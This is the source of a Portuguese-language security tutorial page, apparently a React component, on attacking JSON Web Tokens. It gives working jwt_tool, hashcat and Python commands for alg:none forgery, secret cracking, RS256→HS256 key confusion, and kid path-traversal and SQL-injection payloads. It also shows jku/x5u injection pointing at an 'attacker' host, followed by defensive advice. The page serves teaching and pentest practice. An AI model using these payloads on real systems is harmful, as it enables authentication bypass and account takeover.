import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function JWT() {
  return (
    <PageContainer
      title="JWT — atacando JSON Web Tokens"
      subtitle="Estrutura, alg:none, confusão de chave RS256→HS256, brute force do segredo, e abusos de kid/jku/jwk"
      difficulty="avancado"
      timeToRead="22 min"
    >
      <h2>O que é um JWT</h2>
      <p>
        Um <strong>JSON Web Token</strong> é um token compacto usado para
        autenticação e sessão. São <strong>três partes em Base64URL</strong>
        separadas por ponto: <code>header.payload.signature</code>. Só a
        assinatura é protegida por chave — <em>header e payload são texto claro</em>,
        qualquer um decodifica.
      </p>
      <CodeBlock
        language="text"
        code={`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9   <- header  {"alg":"HS256","typ":"JWT"}
.eyJ1c2VyIjoiam9obiIsImFkbWluIjpmYWxzZX0   <- payload {"user":"john","admin":false}
.dQw4w9WgXcQ_assinatura_aqui                <- signature HMAC-SHA256(base64(h)+'.'+base64(p), chave)`}
      />
      <AlertBox type="info" title="HS256 x RS256">
        <strong>HS256</strong> é simétrico: a mesma chave secreta assina e
        verifica. <strong>RS256</strong> é assimétrico: a chave privada assina,
        a pública verifica. Confundir os dois é uma das falhas mais exploradas.
      </AlertBox>

      <h2>1. Decodificar e inspecionar</h2>
      <p>Antes de atacar, leia o token. Nunca confie no que o app diz — leia o payload.</p>
      <CommandTable
        title="Ferramentas de inspeção"
        variations={[
          { cmd: "jwt_tool <TOKEN>", desc: "Decodifica header + payload e lista alertas de segurança" },
          { cmd: "echo <PAYLOAD_B64> | base64 -d", desc: "Decodifica manualmente uma parte (adicione padding == se reclamar)" },
          { cmd: "jwt_tool <TOKEN> -T", desc: "Modo tamper: edita claims interativamente e regenera" },
        ]}
      />
      <Terminal
        path="~/jwt"
        lines={[
          { comment: "decodifica sem verificar", cmd: "jwt_tool eyJhbGci...", out: "Token header:\n  alg = HS256\nToken payload:\n  user = john\n  admin = false", outType: "muted" },
        ]}
      />

      <h2>2. alg:none — a assinatura opcional</h2>
      <p>
        Se o backend aceita <code>{`"alg":"none"`}</code>, ele valida um token
        <strong> sem assinatura nenhuma</strong>. Troque o header para
        <code>none</code>, apague a assinatura (mas mantenha o ponto final) e
        edite o payload à vontade.
      </p>
      <PracticeBox
        title="Forjar admin com alg:none"
        goal="Virar admin sem conhecer a chave"
        command={`jwt_tool <TOKEN> -X a
# -X a = ataque alg:none (gera variantes none/None/NONE/nOnE)
# copie o token gerado e troque admin:false por admin:true com -T
jwt_tool <TOKEN> -X a -T -pc admin -pv true`}
        expected="Servidor aceita o token forjado e devolve painel de admin"
        verify="Faça a request autenticada com o novo token e confira acesso privilegiado"
      />
      <AlertBox type="warning" title="Variações de case">
        Filtros ingênuos bloqueiam só <code>none</code>. Teste
        <code> None</code>, <code>NONE</code>, <code>nOnE</code> — a lib pode
        fazer <em>lowercase</em> depois da checagem.
      </AlertBox>

      <h2>3. Brute force do segredo (HS256)</h2>
      <p>
        Se o app usa HS256 com um segredo fraco, você quebra offline e passa a
        assinar tokens válidos você mesmo. Sem rate limit, sem ruído.
      </p>
      <CommandTable
        title="Quebra de segredo HMAC"
        variations={[
          { cmd: "jwt_tool <TOKEN> -C -d /usr/share/wordlists/rockyou.txt", desc: "Dicionário direto no jwt_tool" },
          { cmd: "hashcat -a 0 -m 16500 token.txt rockyou.txt", desc: "Modo 16500 = JWT; muito mais rápido na GPU", output: "eyJ...:s3cr3t" },
          { cmd: "jwt_tool <TOKEN> -S hs256 -p 's3cr3t' -T", desc: "Depois de achar o segredo, reassina o token adulterado" },
        ]}
      />
      <Terminal
        path="~/jwt"
        lines={[
          { comment: "quebra com hashcat", cmd: "hashcat -m 16500 token.txt rockyou.txt", out: "eyJhbGciOiJIUzI1NiJ9...:secret123\nStatus...........: Cracked", outType: "success" },
        ]}
      />

      <h2>4. Confusão de chave RS256 → HS256</h2>
      <p>
        O clássico. O servidor espera RS256 (verifica com a pública). Você troca
        o <code>alg</code> para <strong>HS256</strong> e assina o token usando a
        <strong> própria chave pública</strong> como se fosse o segredo HMAC.
        Como a lib usa a mesma chave para verificar, ela valida.
      </p>
      <PracticeBox
        title="Key confusion"
        goal="Assinar um token forjado só com a chave pública"
        command={`# 1. obtenha a public key (endpoint /jwks.json, /.well-known, ou TLS)
# 2. jwt_tool automatiza o ataque:
jwt_tool <TOKEN> -X k -pk public.pem

# manual com openssl + hmac:
python3 -c "import jwt; print(jwt.encode({'user':'admin','admin':True}, open('public.pem').read(), algorithm='HS256'))"`}
        expected="Token HS256 assinado com a pública é aceito como válido"
        verify="Servidor responde 200 com privilégios elevados"
      />
      <AlertBox type="danger" title="Por que funciona">
        A biblioteca decide o algoritmo <em>pelo header do token</em>, não pela
        configuração do servidor. Se ela chama <code>verify(token, key)</code>
        sem fixar o algoritmo, o atacante escolhe o algoritmo.
      </AlertBox>

      <h2>5. Abusos de header: kid, jku, jwk, x5u</h2>
      <p>
        O header pode carregar campos que dizem <em>de onde</em> vem a chave.
        Controlar esses campos costuma virar leitura de arquivo, SSRF ou
        injeção direta de chave.
      </p>
      <CommandTable
        title="Vetores no header"
        variations={[
          { cmd: 'kid: "../../../dev/null"', desc: "Path traversal no kid: aponta a verificação para um arquivo de conteúdo conhecido (ex.: string vazia) e assine com esse valor" },
          { cmd: `kid: "key' UNION SELECT 's3cr3t'-- -"`, desc: "SQLi no kid: se a chave vem de um banco, injete o segredo que você controla" },
          { cmd: 'jku: "https://attacker/jwks.json"', desc: "Aponta o JWK Set para seu servidor; SSRF + você fornece a chave de verificação" },
          { cmd: 'jwk: {sua chave inline}', desc: "Chave pública embutida no header; libs frouxas confiam nela" },
          { cmd: 'x5u: "https://attacker/cert.pem"', desc: "Igual ao jku mas com cadeia X.509" },
        ]}
      />
      <PracticeBox
        title="Injeção via jku"
        goal="Fazer o servidor buscar SUA chave de verificação"
        command={`# 1. gere par de chaves
openssl genrsa -out priv.pem 2048 && openssl rsa -in priv.pem -pubout -out pub.pem
# 2. hospede um JWKS com sua pública em https://attacker/jwks.json
# 3. forje o token apontando jku para lá e assine com priv.pem
jwt_tool <TOKEN> -X s -ju https://attacker/jwks.json -pk priv.pem`}
        expected="Servidor baixa seu JWKS e valida o token que você assinou"
        verify="Teste bypass de allowlist de host no jku (open redirect, @, #, DNS rebinding)"
      />

      <h2>6. Claims e sessão</h2>
      <p>Depois de conseguir assinar, os alvos no payload:</p>
      <OutputBlock type="info" label="Claims que valem ouro">
        <p><code>admin/role/is_staff</code> — escalada de privilégio direta</p>
        <p><code>sub/user_id</code> — troca de conta (IDOR via token)</p>
        <p><code>exp</code> ausente ou no futuro distante — token que nunca expira</p>
        <p><code>iss/aud</code> não validados — reaproveitar token de outro serviço</p>
      </OutputBlock>
      <AlertBox type="warning" title="Sem revogação">
        JWT é stateless: logout no cliente não invalida o token no servidor. Um
        token vazado vale até o <code>exp</code>. Se não há blacklist, roubo de
        token = sessão eterna.
      </AlertBox>

      <h2>7. Checklist e ferramentas</h2>
      <CommandTable
        title="Arsenal JWT"
        variations={[
          { cmd: "jwt_tool -M at", desc: "Modo scanner: roda todos os ataques (alg:none, confusão, kid, jku...) contra um alvo" },
          { cmd: "jwt_tool <TOKEN> -C -d wordlist.txt", desc: "Brute force de segredo" },
          { cmd: "hashcat -m 16500", desc: "Brute force acelerado por GPU" },
          { cmd: "Burp: extensão JWT Editor", desc: "Edita/reassina tokens dentro do fluxo do Burp; automatiza key confusion e jwk" },
        ]}
      />
      <p>
        Lab recomendado: os módulos de <strong>JWT do PortSwigger Web Security
        Academy</strong> cobrem alg:none, brute force, confusão de chave e
        injeção via jku/kid/jwk — todos reproduzíveis com o jwt_tool acima.
      </p>

      <h2>Defesa</h2>
      <OutputBlock type="success" label="Como não ser essa página">
        <p><strong>Fixe o algoritmo</strong> no servidor: <code>verify(token, key, algorithms=['RS256'])</code>. Nunca aceite o alg do token.</p>
        <p><strong>Rejeite alg:none</strong> explicitamente.</p>
        <p><strong>Segredo HS256 forte</strong> (32+ bytes aleatórios), nunca uma palavra de dicionário.</p>
        <p><strong>Ignore jku/jwk/x5u</strong> vindos do token, ou use allowlist estrita de host. Não busque chaves em URL controlada pelo cliente.</p>
        <p><strong>Valide</strong> <code>exp</code>, <code>iss</code> e <code>aud</code> sempre. Use <code>exp</code> curto + refresh token.</p>
        <p><strong>Blacklist/rotação</strong> de tokens no logout e em incidentes.</p>
      </OutputBlock>
    </PageContainer>
  );
}
